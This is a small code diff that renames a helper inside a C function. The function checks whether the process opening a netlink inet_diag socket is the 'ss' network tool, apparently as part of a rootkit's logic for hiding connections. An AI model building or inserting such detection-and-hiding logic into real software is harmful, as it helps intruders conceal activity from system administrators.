@@ -2,9 +2,9 @@ int ssme(int domain, int protocol){
     if(domain != AF_NETLINK || protocol != NETLINK_INET_DIAG)
         return 0;
 
-    if(cmp_process("ss\0")) return 1;
-    if(cmp_process("/usr/bin/ss\0")) return 1;
-    if(cmp_process("/bin/ss\0")) return 1;
+    if(cmpproc("ss\0")) return 1;
+    if(cmpproc("/usr/bin/ss\0")) return 1;
+    if(cmpproc("/bin/ss\0")) return 1;
     return 0;
 }
 
